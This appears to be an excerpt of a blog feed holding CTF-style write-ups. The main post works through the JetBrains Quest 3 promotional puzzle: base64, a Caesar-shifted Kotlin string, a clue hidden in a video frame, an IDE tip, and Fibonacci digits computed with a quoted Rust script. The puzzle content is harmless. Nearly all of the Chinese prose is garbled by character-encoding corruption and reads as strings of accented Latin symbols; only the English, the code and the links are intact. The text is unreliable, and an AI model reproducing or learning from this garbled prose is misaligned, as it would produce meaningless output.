é¢å‰ï¼Œä¸ä»…ä»…éœ€è¦ä¸­å›½åŠªåŠ›ï¼Œæ›´éœ€è¦å…¨ä¸–ç•Œä¸€èµ·è¡ŒåŠ¨èµ·æ¥ï¼Œå…±åŒä¸ç–«æƒ…è¿›è¡Œè¾ƒé‡ã€‚</p><p>è¿™æ˜¯æ•´ä¸ªäººç±»å…±åŒé¢ä¸´çš„å›°éš¾å’ŒæŒ‘æˆ˜ï¼Œä»ä¸­ä¹Ÿæ›´èƒ½æ„è¯†åˆ°<strong>äººç±»å‘½è¿å…±åŒä½“</strong>çš„å«ä¹‰äº†ã€‚</p><p><strong>æ­¦æ±‰åŠ æ²¹ï¼Œä¸­å›½åŠ æ²¹ï¼Œä¸–ç•ŒåŠ æ²¹ï¼</strong></p><p>å†çœ‹ CTFï¼Œæ„Ÿè§‰æ¶‰åŠçš„é¢ä¸æ˜¯ä¸€èˆ¬çš„å¹¿ï¼Œæ›´å¤šçš„æ˜¯æƒ³æ¥å­¦ç‚¹ä¸œè¥¿å§ï¼Œä½ çœ‹äººå®¶å¤§ä½¬éƒ½æ¯”ä½ å‰å®³å‘¢ã€‚</p><p>å…¶ä¸­çš„ MISC é¢˜ç»å¸¸éœ€è¦ä¸å°çš„è„‘æ´ï¼Œæ¯”å¦‚ æ­¦æ±‰åŠ æ²¹ã€éšè—çš„ä¿¡æ¯ ä¹‹ç±»çš„é¢˜ç›®å°±æ˜¯å‘¢ã€‚</p><p><strong>æˆ–è®¸è¿™å°±æ˜¯CTFçš„é­…åŠ›å§ï¼</strong>  </p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/charms_of_CTF.png" alt="charms_of_CTF"></p><p>å¯èƒ½æ–‡ä¸­æœ‰çš„è¡¨è¿°ä¸å¤§ä¸¥è°¨ï¼Œä¸è¦å¤ªåœ¨æ„ï¼ˆ</p><p><del>è¿™ç¯‡å…¶å®å†™çš„ä¹Ÿå¾ˆæ°´</del></p><p>ï¼ˆæºœ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | JetBrains Quest 3 WriteUp/æ”»ç•¥</title>
      <link href="2020/03/14/CTF_2020JetBrainsQuest3/"/>
      <url>2020/03/14/CTF_2020JetBrainsQuest3/</url>
      
        <content type="html"><![CDATA[<h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>æ™šä¸Šçœ‹åˆ° JetBrains æœ€åä¸€ä¸ª Quest å‡ºæ¥äº†ï¼Œäºæ˜¯ç»§ç»­æ¥è§£ä¸ªè°œå§ï¼</p><p>å‰ä¸¤ä¸ª JetBrainsQuest çš„ WriteUp åœ¨è¿™é‡Œâ†“å‘¢ã€‚</p><p><a href="https://miaotony.xyz/2020/03/12/CTF_2020JetBrainsQuest/"><strong>CTF | JetBrains Quest 1&amp;2 WriteUp/æ”»ç•¥</strong></a> </p><p>è¿™æ¬¡çš„éš¾åº¦æ¯”ä¸Šæ¬¡è¦å¤§ä¸€äº›ï¼Œä¸è¿‡æ€»ä½“è€Œè¨€ä¹Ÿä¸å¤ªéš¾å•¦ã€‚</p><blockquote><p>ATTENTION! </p><p style="color:red">ä¸‹é¢çš„å†…å®¹ <strong>æ¶‰åŠå‰§é€</strong>ï¼</p><p><strong>å¦‚æœæƒ³è‡ªå·±åšçš„è¯ï¼Œå°±æš‚æ—¶ä¸è¦å¾€ä¸‹çœ‹äº†ï¼</strong></p></blockquote><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>æ¨ç‰¹åœ°å€ï¼š</p><p><a href="https://twitter.com/jetbrains/status/1238420744817782784">https://twitter.com/jetbrains/status/1238420744817782784</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Quest3.png" alt="Quest 3"></p><p>å™«ï¼è¿™æ˜¯æœ€åä¸€ä¸ª quest äº†ï¼æ¥è§£å¯†å§~</p><blockquote><p>SGF2ZSB5b3Ugc2VlbiB0aGUgcG9zdCBvbiBvdXIgSW5zdGFncmFtIGFjY291bnQ/</p></blockquote><p>base64 è§£å¯†å¾—åˆ°</p><blockquote><p>Have you seen the post on our Instagram account?</p></blockquote><p>å» Instagram æ‰¾æ‰¾çº¿ç´¢ã€‚</p><br><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>å‰å¾€ JetBrains çš„Insï¼š <a href="https://www.instagram.com/jetbrains/">https://www.instagram.com/jetbrains/</a></p><p>ç¬¬ä¸€å¼ å›¾å°±æ˜¯ç†Ÿæ‚‰çš„ Quest é¢†å–ç¦åˆ©çš„é¡µé¢èƒŒæ™¯äº†ã€‚</p><p>ï¼ˆç•™ä¸ª<a href="https://www.instagram.com/p/B9q-CnhoUVl/">å¤‡ä»½é“¾æ¥</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step2.png" alt="Ins"></p><blockquote><p>Welcome to the final Quest! You should start on the Kotlin Playground: <a href="https://jb.gg/kotlin_quest">https://jb.gg/kotlin_quest</a><br>P.S. If you donâ€™t know about the #JetBrainsQuest, itâ€™s not too late to find out.</p></blockquote><p>å¾—åˆ°ä¸€ä¸ªç½‘å€ï¼š<a href="https://jb.gg/kotlin_quest">https://jb.gg/kotlin_quest</a></p><br><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>è®¿é—®ä¸Šé¢çš„ç½‘å€ï¼Œå‘ç°è·³è½¬åˆè·³è½¬ï¼Œæœ€ç»ˆæ¥åˆ°äº†ä¸€ä¸ª <strong>Kotlin åœ¨çº¿ç¼–ç¨‹é¡µé¢</strong>ã€‚</p><p>å°±æ˜¯ä»–è¯´çš„ <code>the Kotlin Playground</code> å§ã€‚</p><p>åœ°å€<a href="https://play.kotlinlang.org/#eyJ2ZXJzaW9uIjoiMS4zLjUwIiwiY29kZSI6ImZ1biBtYWluKCkge1xuICAgdmFsIHMgPSBcIlpoI2tkeWgjZWhocSN6cnVubHFqIzU1MjojcnEjd2toI3lsZ2hyI2lydSN3a2gjaWx1dncjaHNsdnJnaCNyaSN3a2gjU2tzVndydXAjSERTMSNMaSN6aCNqZHloI3xyeCNkI2ZveGgvI2x3I3pyeG9nI2VoI2hkdnwjZHYjc2wxXCJcblxuICAgIHZhbCBuOiBJbnQgPSBUT0RPKClcbiAgIGZvciAoYyBpbiBzKSB7XG4gICAgICAgcHJpbnQoYyAtIG4pXG4gICB9XG59IiwicGxhdGZvcm0iOiJqYXZhIiwiYXJncyI6IiJ9">åœ¨è¿™é‡Œ</a> ï¼ˆé“¾æ¥å¤ªé•¿äº†å°±ä¸æ˜¾ç¤ºå‡ºæ¥å¥½äº†</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step3.png" alt="Step3"></p><pre class="language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">val</span> s <span class="token operator">=</span> <span class="token string">"Zh#kdyh#ehhq#zrunlqj#552:#rq#wkh#ylghr#iru#wkh#iluvw#hslvrgh#ri#wkh#SksVwrup#HDS1#Li#zh#jdyh#|rx#d#foxh/#lw#zrxog#eh#hdv|#dv#sl1"</span>    <span class="token keyword">val</span> n<span class="token operator">:</span> Int <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span>c <span class="token keyword">in</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">print</span><span class="token punctuation">(</span>c <span class="token operator">-</span> n<span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>è¿™ä¸ªå«ä¹‰å¾ˆæ˜æ˜¾å‘¢ã€‚å°±æ˜¯æŠŠå­—ç¬¦ä¸² <code>s</code> æ¯ä¸ªå­—æ¯å¾€å‰ç§»åŠ¨ n ä¸ªå­—ç¬¦å¥½äº†ã€‚ï¼ˆi.e. SHIFTxï¼Œå‡¯æ’’å¯†ç ä¹‹ç±»çš„ï¼‰</p><p>æˆ‘ä¹Ÿä¸è®°å¾— n æ˜¯å¤šå°‘äº†emmmï¼Œåæ­£ä¸ªä½æ•°å§ï¼Œè¯•ä¸€è¯•å°±å‡ºæ¥äº†ã€‚</p><p>äºæ˜¯å¾—åˆ°</p><pre class="language-none"><code class="language-none">We have been working 22/7 on the video for the first episode of the PhpStorm EAP. If we gave you a clue, it would be easy as pi.</code></pre><p>å…³é”®è¯ï¼š<strong>video</strong>ï¼Œ<strong>PhpStorm EAP</strong>ï¼Œ<strong>pi</strong>ã€‚</p><p>ç›²çŒœå°±ä¸ 3.14/3.1415926 ä¹‹ç±»çš„æœ‰å…³ã€‚</p><br><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>æœç´¢ <strong>PhpStorm EAP</strong>ï¼Œæ¥åˆ°äº†<a href="https://www.jetbrains.com/phpstorm/nextversion/">ä»–çš„ç½‘ç«™</a>ã€‚</p><p>å™¢è¿™æ˜¯ä¸ª PHP çš„ IDE å•Šã€‚EAP ç›¸å½“äºé¢„å‘å¸ƒç‰ˆæœ¬ï¼Ÿ</p><blockquote><p><strong>PhpStorm Early Access Program</strong></p><p>At JetBrains, we believe that to make great tools for developers, we should listen to and involve developers. Our Early Access Program (EAP) lets our development community participate in the product discussions and influence development planning, from the very early stages.</p></blockquote><p>åœ¨é¡µé¢ä¸Šæ²¡æœ‰æ‰¾åˆ° <code>quest</code>ï¼Œä¹Ÿæ²¡æ‰¾åˆ°è§†é¢‘åŠå…¶é“¾æ¥ï¼Œçœ‹äº†ä¸€ä¸‹æœ€æ–°çš„ç‰ˆæœ¬æ˜¯ <code>2020.1 EAP build 201.6251.26 Released: March 12, 2020</code>ã€‚</p><p>çœ‹äº†ä¸€ä¸‹ <strong>Blog &amp; Social</strong>ï¼Œæ¥åˆ° PHPSTORM çš„ <a href="https://blog.jetbrains.com/phpstorm/">blog</a>ï¼Œçœ‹åˆ°äº†æœ€æ–°ç‰ˆæœ¬å‘å¸ƒçš„ Postã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/PhpStorm_Blog.png" alt="PhpStorm Blog"></p><p>å¥½äº†ï¼Œæœ‰è§†é¢‘é“¾æ¥äº†ï¼<a href="https://www.youtube.com/playlist?list=PLQ176FUIyIUb7qSArPCxOkIGX-cqdfoBx"><em>Whatâ€™s Coming in PhpStorm 2020.1</em></a></p><p>åœ¨ Whatâ€™s Coming in PhpStorm 2020.1 â€“ EAP Series | Season 2020.1 Episode 1 è¿™ä¸ªè§†é¢‘é‡Œï¼Œé‡ç‚¹å…³æ³¨ PI å³ 3â€™14â€™â€™ é™„è¿‘çš„å†…å®¹ã€‚</p><p>å‘ç°ç”»é¢æŠ–åŠ¨äº†ä¸¤ä¸‹ emmm æœ‰çŒ«è…»ï¼ </p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4.png" alt="video"></p><p>çŒœæƒ³çº¿ç´¢è—åœ¨æŠ–åŠ¨çš„ä½ç½®ï¼Œç„¶è€Œçœ‹äº†å‡ éï¼Œç”šè‡³å¼€åˆ°æœ€æ…¢çš„ 0.25 å€é€Ÿï¼Œéƒ½æ²¡çœ‹å‡ºæ¥ emmm<em>ï¼ˆå¥½èœå•Š</em></p><p>äºæ˜¯æ‰¾äº†ä¸ªå·¥å…·æŠŠè¿™ä¸ªè§†é¢‘ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾ Premiere é‡Œé€å¸§çœ‹ã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_PR.png" alt="Premiere"></p><p>è£å‰ªäº†ï¼Œæ”¾å¤§å†çœ‹è¿™1ç§’å¤šçš„ç‰‡æ®µã€‚æœ€åå‘ç° <code>homepage</code> è¿™é‡Œå‘ç”Ÿäº†å˜åŒ–ã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_homepage.png" alt="homepageå˜åŒ–"></p><p>åŸæ¥ä»–çš„æ„æ€æ˜¯ clue åœ¨è¿™ä¸¤æ®µæŠ–åŠ¨ä¹‹é—´å•Šï¼</p><p>äºæ˜¯å¾—åˆ°ä¸‹ä¸€ä¸ªé“¾æ¥ï¼š<a href="https://jb.gg/31415926">https://jb.gg/31415926</a></p><p>çš„ç¡®ä¸ PI æœ‰å…³å‘¢ï¼ˆ</p><blockquote><p>æœ‰æ„æ€çš„æ˜¯ï¼Œ<strong>è¿™ä¸ªè§†é¢‘2æœˆ10æ—¥å°±å‘å¸ƒäº†</strong>ï¼ŒçœŸæ˜¯è“„è°‹å·²ä¹…å•Š 233333.</p><p>çœ‹è¯„è®ºåŒºè¿˜æœ‰äººä¸€ä¸ªæœˆå‰ç–‘æƒ‘å‘¢ã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_comments.png" alt="comments"></p></blockquote><br><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>è®¿é—® <a href="https://jb.gg/31415926">https://jb.gg/31415926</a></p><p>301è·³è½¬åˆ° <a href="https://www.quiz-maker.com/Q2723CE">https://www.quiz-maker.com/Q2723CE</a></p><p>ï¼ˆå‘ç°è¿™ä¸ª <a href="http://www.quiz-maker.com/">www.quiz-maker.com</a> æ˜¯ä¸ªæŒºä¸é”™çš„åœ¨çº¿ quiz ç½‘ç«™å‘¢</p><blockquote><p><strong>The Easiest #1 Rated Online Quiz Maker</strong></p><p>Publish your quiz in a matter of minutes. Go ahead Try it now!</p></blockquote><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step5.png" alt="Step5"></p><p>ç„¶åéœ€è¦ä½ åœ¨ 1min å†…å›ç­”å…³äº JB çš„ä¸€äº›é—®é¢˜ã€‚</p><p>ï¼ˆçœŸæŒºå¥½ï¼Œé¡ºä¾¿å®£ä¼ ä¸€ä¸‹è‡ªå·±ã€‚</p><p>åšä¸å¯¹å†é‡æ¥ï¼Œç„¶åå‘ç°æ¯æ¬¡è¿˜æœ‰æ–°çš„é¢˜ç›®ï¼ˆé»‘è„¸</p><p>ç„¶åæˆ‘åšäº†å¥½å¤šæ¬¡ï¼Œå‘ç°è°·æ­Œæœç´¢çš„ ç²¾é€‰æ‘˜è¦ çœŸçš„å¥½ç”¨ã€‚</p><p>æœ€åç»ˆäºå…¨å¯¹äº†ã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step5_2.png" alt="Step5_2"></p><blockquote><p>Almost there! The last challenge is in the <em>Tips of the Day</em> of a specific IntelliJ IDEA Community version from our latest build page in Confluence, butâ€¦ there is a catch. You have to know which version to look for. To find the build number, you need sight beyond sight:</p><p>. Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything.</p></blockquote><p>çœ‹æ¥ä¸ <em>Tips of the Day</em> of a specific IntelliJ IDEA Community version æœ‰å…³ï¼Œè—åœ¨æ¯æ—¥æç¤ºé‡Œå¯è¿˜è¡Œï¼Œè€Œä¸”è¿˜æ˜¯ä¸€ä¸ªç¥ç§˜çš„ç‰ˆæœ¬ã€‚è¿™ä¸ªç‰ˆæœ¬éƒ¨ç½²åœ¨ Confluence ä¸Šé¢ã€‚</p><p>ä¸‹é¢è¿™æ®µè¯æœ‰ç‚¹æ‘¸ä¸ç€å¤´è„‘ã€‚</p><p>ä¸ç®¡äº†å…ˆå» IDEA ç½‘ç«™ä¸Šçœ‹çœ‹ï¼Œéš¾é“é¡ºä¾¿éª—ä¸€æ³¢ä¸‹è½½é‡ï¼Ÿï¼Ÿï¼Ÿ</p><br><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p>è®¿é—® IDEA å®˜ç½‘ï¼Œé¡ºç€ Release Notesï¼Œæ¥åˆ°äº†<a href="https://confluence.jetbrains.com/collector/pages.action?key=IDEADEV">è¿™é‡Œ</a>ã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step6.png" alt="Step6"></p><p>ç¬¬ä¸€ä¸ªå°±æ˜¯å§ã€‚è¿˜æ˜¯å‡ ä¸ªå°æ—¶å‰åˆšå‘å¸ƒçš„å‘¢ï¼</p><p>å°±æ˜¯è¿™ä¸ªï¼š<a href="https://confluence.jetbrains.com/display/IDEADEV/IDEA+2020.1+Quest+Build+Edition">IDEA 2020.1 Quest Build Edition</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step6_QuestBuildEdition.png" alt="Step6_QuestBuildEdition"></p><p>ä¸‹è½½ä¸‹æ¥è€Œåå®‰è£…ã€‚ä»€ä¹ˆï¼Œ1.4GBï¼Ÿï¼Ÿï¼Ÿ</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/IEDA_Setup.png" alt="IEDA_Setup"></p><p>éšä¾¿äº†éšä¾¿äº†ï¼Œè£…å®Œå¸æ‰å¥½äº†ã€‚ï¼ˆä¸è¿‡å¬è¯´ç”¨æ¥å†™ Java æŒºå¥½ç”¨çš„</p><p><em>ï¼ˆä¼°è®¡è¿™é‡Œè¿˜èƒ½å¼•ä¸€æ³¢æµå‘¢</em></p><br><h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h2><p>è£…å¥½äº†éšæ„å»ºä¸€ä¸ªé¡¹ç›®ï¼Œå”¤å‡º Tip of the Day.</p><p>ç¿»äº†å‡ é¡µä¹‹åæ‰¾åˆ°äº†ã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step7.png" alt="Tip of the Day"></p><blockquote><p><strong>JETBRAINS QUEST</strong>: LAST PUZZLE</p><p><em>You have discovered our JetBrains Quest! If you donâ€™t know what this is, you should start from the beginning.</em></p><p>This is it. The last puzzle. You are just one step away from glory!<br>Now you just need the Key to unlock the Quest page.<br>The Key is the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million)).<br>As you may know by now, not all that glitters is gold, and to solve this puzzle you should not go straight for the obvious answer. May you make a glorious choice.  </p><p>Remember that you have until the 15th of March 12:00 CEST.</p></blockquote><p>æ‰€ä»¥è¿™é‡Œè¦æ‰¾åˆ° *<em>the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million))*</em></p><p>å³ <strong>Fibonacci æ•°åˆ— 50Ã—10^6 ä½ç½®çš„å‰4ä½å’Œå4ä½</strong>ã€‚</p><p>Quest Page å°±æ˜¯ä¹‹å‰çš„ <a href="https://www.jetbrains.com/promo/quest/">https://www.jetbrains.com/promo/quest/</a></p><br><h2 id="Beat-the-Quest"><a href="#Beat-the-Quest" class="headerlink" title="Beat the Quest"></a>Beat the Quest</h2><p>é‚£å°±ç®—å§ï¼Œå‰å››ä½å¥½ç®—ï¼Œåå››ä½æœ‰ç‚¹éš¾é¡¶ã€‚</p><p>æœäº†ä¸€ä¸‹Googleå‘ç°å‡ºä¸æ¥ã€‚</p><p>ä¸è¿‡æ‡’å¾—æ‰‹æ’¸ä»£ç ç®—äº†ï¼Œç›´æ¥æ‰¾ <a href="https://www.wolframalpha.com/">wolframalpha</a> å§ï¼</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/wolframalpha.png" alt="wolframalpha"></p><p>å‰å››ä½æ˜¯4602ã€‚åå››ä½çš„è¯ï¼Œmod 10000å‡ºç»“æœã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/wolframalpha2.png" alt="wolframalpha2"></p><p>å¾—åˆ°åå››ä½ä¸º3125ã€‚</p><p>äºæ˜¯ Code å°±æ˜¯ <code>46023125</code>å•¦ï¼</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/BeatTheQuest.png" alt="BeatTheQuest"></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/ComeToAnEnd.png" alt="ComeToAnEnd"></p><p>æ‰€ä»¥æœ€ç»ˆå¾—åˆ°çš„æ˜¯ <strong>JB å®¶å…¨å®¶æ¡¶å…«æŠ˜åˆ¸</strong> emmmm </p><p><del>ï¼ˆè¿˜ä»¥ä¸ºæ˜¯å…­ä¸ªæœˆæˆæƒå‡‘æˆä¸€å¹´çš„å‘¢</del></p><p><em>ä¸ç®¡äº†ï¼Œåæ­£æœ¬æ¥å°±æœ‰æ•™è‚²æˆæƒä¸å·®è¿™ä¸ªï¼ˆ</em></p><p><strong>å¥½ç©å°±è¡Œäº† 23333</strong></p><p>å¦‚æœä½ éœ€è¦çš„è¯ï¼Œ<strong>Remember that you have until the 15th of March 12:00 CEST.</strong></p><br><h2 id="å†çœ‹-Step-5-ä¸­çš„-Clue"><a href="#å†çœ‹-Step-5-ä¸­çš„-Clue" class="headerlink" title="å†çœ‹ Step 5 ä¸­çš„ Clue"></a>å†çœ‹ Step 5 ä¸­çš„ Clue</h2><p>æœ¬æ¥æœ¬æ–‡åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œç„¶åæƒ³èµ·æ¥ä¹‹å‰çš„ clue æœ‰ç‚¹æƒ³ä¸é€šï¼Œå†æ¥çœ‹çœ‹ã€‚</p><blockquote><p>. Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything.</p></blockquote><p>çœ‹äº†ä¸€äº› V2EX ä¸Šçš„è®¨è®ºï¼Œå‘ç°åªçœ‹é¦–å­—æ¯å¯ä»¥æ‹¼å‡ºä¸€å¥è¯ã€‚</p><blockquote><p>.net day call for speakers blog post image hides the next clue</p></blockquote><p>æœäº†ä¸€ä¸‹ï¼Œæ¥åˆ°äº†è¿™é‡Œã€‚</p><p><a href="https://blog.jetbrains.com/dotnet/2020/02/13/jetbrains-net-day-online-2020-call-speakers/">JetBrains .NET Day Online 2020 â€“ Call for Speakers</a></p><p>åœ¨è¿™å¼ å›¾ç‰‡è¿™é‡Œæ‰¾åˆ°äº†çº¿ç´¢ã€‚ï¼ˆå™—</p><p><strong>you_are_looking_for_build_201-6303</strong></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/you_are_looking_for_build_201-6303.png" alt="you_are_looking_for_build_201-6303"></p><p>ä¸è¿‡é—®é¢˜ä¸å¤§2333. åæ­£ä¹Ÿæ‰¾åˆ°äº†å‘¢ã€‚</p><br><h2 id="Extensive-Reading"><a href="#Extensive-Reading" class="headerlink" title="Extensive Reading"></a>Extensive Reading</h2><p>å†çœ‹äº†çœ‹<a href="https://www.v2ex.com/t/652589">å¤§ä½¬ä»¬çš„è®¨è®º</a>ï¼Œå‘ç°æœ‰å¤§ä½¬ç”¨ rust å†™äº†ä¸ª <a href="https://play.rust-lang.org/?version=stable&amp;mode=release&amp;edition=2018&amp;gist=b66221ebd69b64d63feb1fe46631957b">jioæœ¬</a> ç®—å‡ºäº†åå››ä½ã€‚</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Script_Rust.png" alt="Script_Rust"></p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> a2<span class="token punctuation">:</span> <span class="token keyword">u128</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> a1<span class="token punctuation">:</span> <span class="token keyword">u128</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">3</span><span class="token punctuation">..=</span><span class="token number">50000000</span> <span class="token punctuation">{</span>    <span class="token comment">//for i in 3..=50 {</span>        <span class="token keyword">let</span> new <span class="token operator">=</span> a2 <span class="token operator">+</span> a1<span class="token punctuation">;</span>        a2 <span class="token operator">=</span> a1<span class="token punctuation">;</span>        <span class="token keyword">if</span> new <span class="token operator">&gt;</span> <span class="token number">10000</span> <span class="token punctuation">{</span>            a1 <span class="token operator">=</span> new <span class="token operator">%</span> <span class="token number">10000</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            a1 <span class="token operator">=</span> new<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>            <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"\r[{}]"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"\nok: {}"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ä»–çš„æ€è·¯æ˜¯ï¼š</p><blockquote><p>åå››ä½æˆ‘è‡ªå·±å†™ç¨‹åºè·‘ï¼Œè¶…è¿‡å››ä½æ•°å°±å‡æ‰ä¸€ä¸‡ï¼Œç­‰äºåªç®—æœ€åå››ä½ã€‚</p></blockquote><p>è¿˜æœ‰å¤§ä½¬å‘ç°äº† Fib æ•°åˆ—æ˜¯æœ‰è§„å¾‹çš„â†“ã€‚</p><p><a href="http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibmaths.html#section1.1">http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibmaths.html#section1.1</a></p><p>etc.</p><br><hr><br><h2 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h2><p>ä»Šå¤©æ˜¯ PI æ—¥ï¼ŒèŠ‚æ—¥å¿«ä¹å‘€ï¼</p><p>æœ€è¿‘<strong>å¯¹åšå®¢è¿›è¡Œäº†ä¸€äº›ä¼˜åŒ–</strong>ï¼Œæˆ–è€…è¯´æ˜¯é™¤è‰äº†ï¼Œæ‡’å¾—å¼€æ–°æ–‡ç« å†™äº†ã€‚</p><p>ä¸»è¦è®©å¸¸ç”¨çš„ JavaScriptã€CSSã€ä¸€äº›èƒŒæ™¯å›¾ç‰‡èµ° jsdelivr çš„ cdnï¼Œä¼˜åŒ–ä¸€ç‚¹åŠ è½½é€Ÿåº¦ã€‚</p><p>ç„¶åä¿®æ”¹äº† hexo çš„ feed æ’ä»¶ï¼ŒæŠŠ RSS ä¸­çš„ <code>summary</code> ä¼˜åŒ–ä¸ºäº†æ–‡ç« çš„æ‘˜è¦ï¼ˆåŸæ¥æ˜¯æˆªå–å…¨æ–‡æœ€å¼€å§‹çš„ä¸€éƒ¨åˆ†æ–‡å­—ï¼Œè¿˜ä¿ç•™ç€ä¸€å †æ ‡ç­¾ï¼Œä¸‘æ­»äº†ï¼‰ã€‚æœŸé—´è¿˜å‘ç°æŠ¥é”™äº†ï¼Œåæ¥å» Github å‚è€ƒäº†å¤§ä½¬ä»¬æ›´æ–°çš„æºç æ”¹äº†ä¸€ä¸‹æ¨¡æ¿ã€‚</p><p>è¿™æ · RSS çš„æ•ˆæœå°±å¥½å¤šäº†ã€‚</p><p>æ¬¢è¿å¤§ä½¬ä»¬å…³æ³¨ï¼Œå’Œæˆ‘äº¤æ¢å‹é“¾å‘€ï¼</p><p><strong>RSS åœ°å€</strong>ï¼š<a href="https://miaotony.xyz/atom.xml">https://miaotony.xyz/atom.xml</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/rss.png" alt="rss"></p><p><del>ï¼ˆæ„Ÿè§‰è¶Šå†™è¶Šæ°´äº†</del></p><p>ï¼ˆæºœäº†æºœäº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | JetBrains Quest 1&amp;2 WriteUp/æ”»ç•¥</title>
      <link href="2020/03/12/CTF_2020JetBrainsQuest/"/>
      <url>2020/03/12/CTF_2020JetBrainsQuest/</url>
      
